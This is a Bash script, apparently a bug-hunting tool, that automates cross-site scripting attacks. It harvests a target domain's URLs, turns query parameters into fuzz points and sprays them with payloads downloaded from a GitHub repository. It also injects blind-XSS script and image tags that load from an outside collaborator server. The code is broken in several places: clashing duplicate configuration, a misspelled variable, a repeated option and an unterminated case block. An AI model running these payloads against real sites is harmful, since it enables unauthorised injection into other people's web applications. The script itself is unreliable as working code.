# XSS Hunter Ultimate v4.0
# Author: @Kdairatchi
# █▀▀ █░█ █▀█ █▀▀ ▀█▀ █▀▀ █▀█ █▀▄ ▄▀█ █▀▀ █▄▀
# █▄▄ █▀█ █▄█ █▄▄ ░█░ ██▄ █▀▄ █▄▀ █▀█ █▄▄ █░█

# Configuration
DASHBOARD_PORT=1337
DASHBOARD_HOST="127.0.0.1"
RESULTS_DB="${HOME}/.xss_hunter.db"
COLLAB_SERVER="your-collab-server.com"

# Configuration
VERSION="3.0"
PAYLOAD_FILE="${HOME}/.xss_hunter_payloads.txt"
CONFIG_FILE="${HOME}/.xss_hunter.conf"
TOOL_DIR="$HOME/go/bin"
INSTALL_DIR="/usr/local/bin"
TEMP_DIR=$(mktemp -d)
REPO_URL="https://raw.githubusercontent.com/haxshadow/payload/main/"

# Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# ASCII Art
show_banner() {
    echo -e "${PURPLE}
    ██╗  ██╗███████╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
    ╚██╗██╔╝██╔════╝██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
     ╚███╔╝ ███████╗███████╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
     ██╔██╗ ╚════██║╚════██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
    ██╔╝ ██╗███████║███████║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
    ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
    ${RESET}"
    echo -e "${CYAN}                            [ ${BOLD}Advanced XSS Scanning Suite v${VERSION}${RESET}${CYAN} ]"
    echo -e "${YELLOW}                                 Author: @Kdairatchi${RESET}\n"
}

# Initialization
set -eo pipefail
trap cleanup EXIT INT TERM

# Cleanup function
cleanup() {
    rm -rf "$TEMP_DIR"
    echo -e "\n${GREEN}${BOLD}[+]${RESET} Cleaned up temporary resources"
}

# Error handling
fatal() {
    echo -e "${RED}${BOLD}[-] FATAL:${RESET} $1" >&2
    exit 1
}

# Check dependencies
check_tools() {
    local tools=("anew" "qsreplace" "bxss" "urlfinder" "google-chrome")
    local missing=0

    echo -e "\n${CYAN}${BOLD}[*]${RESET} System Health Check:"
    for tool in "${tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            echo -e "${GREEN}  ✓${RESET} $tool\t$(which $tool)"
        else
            echo -e "${RED}  ✗${RESET} $tool"
            missing=$((missing+1))
        fi
    done
    
    [ $missing -gt 0 ] && fatal "$missing critical components missing"
}

# Install components
install_tools() {
    echo -e "\n${CYAN}${BOLD}[*]${RESET} Initializing System Setup..."
    mkdir -p "$TEMP_DIR" || fatal "Failed to create temp directory"
    
    install_golang_tools() {
        echo -e "\n${YELLOW}${BOLD}[+]${RESET} Deploying Security Tools:"
        local tools=(
            "github.com/tomnomnom/qsreplace"
            "github.com/tomnomnom/anew"
            "github.com/ethicalhackingplayground/bxss/v2/cmd/bxss"
            "github.com/projectdiscovery/urlfinder/cmd/urlfinder"
        )
        
        for tool in "${tools[@]}"; do
            echo -e "${CYAN}  ➔${RESET} Installing ${tool##*/}..."
            GO111MODULE=on go install -v "$tool@latest" || fatal "Failed to install ${tool##*/}"
        done
    }

    install_chrome() {
        if ! command -v google-chrome &>/dev/null; then
            echo -e "\n${YELLOW}${BOLD}[+]${RESIX} Deploying Chrome Engine:"
            wget -qP "$TEMP_DIR" https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb \
                || fatal "Chrome download failed"
            sudo dpkg -i "$TEMP_DIR"/google-chrome-stable*.deb >/dev/null 2>&1 \
                || sudo apt install -f -y >/dev/null 2>&1
        fi
    }

    deploy_payloads() {
        echo -e "\n${YELLOW}${BOLD}[+]${RESET} Updating Attack Signatures:"
        wget -q "${REPO_URL}bxssMostUsed.txt" -O "$PAYLOAD_FILE" \
            || fatal "Payload update failed"
    }

    install_golang_tools
    install_chrome
    deploy_payloads
    
    echo -e "\n${GREEN}${BOLD}[+]${RESET} Finalizing Installation..."
    sudo mv -vf "$TOOL_DIR"/* "$INSTALL_DIR" >/dev/null 2>&1
    
    echo -e "\n${GREEN}${BOLD}[✓]${RESET} System Ready for Offensive Operations"
}

# Scanning Engine
scan_target() {
    local target="$1"
    echo -e "\n${CYAN}${BOLD}[*]${RESET} Initializing Target Acquisition: ${PURPLE}${target}${RESET}"
    
    sanitize_domain() {
        echo "$target" | sed -E 's,(https?://)?(www\.)?,,i; s,/.*,,'
    }

    collect_endpoints() {
        urlfinder -d "$(sanitize_domain)" -all -silent \
            | grep -aviE "\.(js|css|json|ico|woff|svg|ttf|eot|png|jpg)([?#]|$)"
    }

    echo -e "${YELLOW}${BOLD}[+]${RESET} Phase 1: Target Enumeration"
    collect_endpoints | tee "$TEMP_DIR/endpoints.txt"
    
    echo -e "${YELLOW}${BOLD}[+]${RESET} Phase 2: Attack Surface Mapping"
    cat "$TEMP_DIR/endpoints.txt" | qsreplace "FUZZ" | anew > "$TEMP_DIR/fuzzpoints.txt"
    
    echo -e "${YELLOW}${BOLD}[+]${RESET} Phase 3: Payload Deployment"
    bxss -i "$TEMP_DIR/fuzzpoints.txt" -p "$PAYLOAD_FILE" -v \
        | tee "$TEMP_DIR/results.txt"
    
    [ -s "$TEMP_DIR/results.txt" ] && \
        echo -e "\n${RED}${BOLD}[!]${RESET} Identified Vulnerable Targets:" && \
        cat "$TEMP_DIR/results.txt"
}

# Initialize Blind XSS Tracking
init_blind_xss() {
    echo -e "${CYAN}${BOLD}[*]${RESET} Initializing Blind XSS Payloads..."
    
    # Generate unique tracking identifiers
    local campaign_id=$(uuidgen | cut -d'-' -f1)
    local payload_url="https://${COLLAB_SERVER}/x/${campaign_id}"
    
    # Create dashboard listener
    start_dashboard_server
    
    # Inject blind payloads
    echo -e "${YELLOW}${BOLD}[+]${RESET} Deploying Tracking Payloads:"
    echo "<script src='${payload_url}'></script>" > "${TEMP_DIR}/blind_payload.txt"
    echo "<img src='${payload_url}' />" >> "${TEMP_DIR}/blind_payload.txt"
    
    bxss -i "$TEMP_DIR/fuzzpoints.txt" -p "${TEMP_DIR}/blind_payload.txt" -v
}

# Start Dashboard Server
start_dashboard_server() {
    echo -e "${CYAN}${BOLD}[*]${RESET} Launching Recon Dashboard..."
    python3 "${HOME}/.xss_hunter_dashboard.py" \
        --port $DASHBOARD_PORT \
        --host $DASHBOARD_HOST \
        --db $RESULTS_DB &
}

# Main Execution
show_banner

while getopts ":hd:l:u:civus" opt; do
    case $opt in
        h) 
            echo -e "\n${CYAN}Operational Parameters:"
            echo -e "  -d DOMAIN    Target domain analysis"
            echo -e "  -l LIST      Multiple target engagement"
            echo -e "  -u URL       Direct URL assessment"
            echo -e "  -c           Initialize combat systems"
            echo -e "  -i           System integrity check"
            echo -e "  -v           Enable verbose diagnostics"
            echo -e "  -s           Stealth reconnaissance mode"
            echo -e "  -u           Update tactical database"
            exit 0
            ;;
        d) TARGET="$OPTARG"; MODE="single" ;;
        l) TARGET="$OPTARG"; MODE="multi" ;;
        u) TARGET="$OPTARG"; MODE="direct" ;;
        c) install_tools; exit 0 ;;
        i) check_tools; exit 0 ;;
        v) set -x ;;
        s) STEALTH=1 ;;
        \?) fatal "Invalid parameter: -$OPTARG" ;;
        :) fatal "Parameter -$OPTARG requires specification" ;;
    esac
done

[ -z "$TARGET" ] && fatal "No target specified"
check_tools

case $MODE in
    "single") scan_target "$TARGET" ;;
    "multi") 
        while IFS= read -r domain; do 
            [ -n "$domain" ] && scan_target "$domain"
        done < "$TARGET"
        ;;
    "direct") 
        echo "$TARGET" | bxss -p "$PAYLOAD_FILE" -v 
        ;;
esac

# Main Execution
show_banner

case $1 in
    --dashboard)
        start_dashboard_server
        exit 0
        ;;
    --blind)
        init_blind_xss
        exit 0
        ;;

echo -e "\n${GREEN}${BOLD}[✓]${RESET} Mission Completed Successfully"
